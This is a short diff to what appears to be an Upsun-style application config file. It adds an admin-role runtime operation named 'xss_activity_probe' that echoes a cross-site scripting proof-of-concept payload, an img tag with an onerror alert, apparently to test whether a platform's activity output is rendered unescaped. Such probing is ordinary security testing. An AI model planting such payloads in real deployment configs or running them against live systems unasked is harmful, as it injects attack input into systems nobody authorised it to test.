@@ -67,6 +67,12 @@ applications:
                 set -eux
                 uv sync --frozen --no-dev --no-managed-python
                 
+        operations:
+            xss_activity_probe:
+                role: admin
+                commands:
+                    start: 'echo "UPSUN_RUNTIME_POC <img src=x onerror=alert(1)>"'
+
         web:
             commands:
                 start: ".venv/bin/gunicorn -b 0.0.0.0:$PORT main:app"
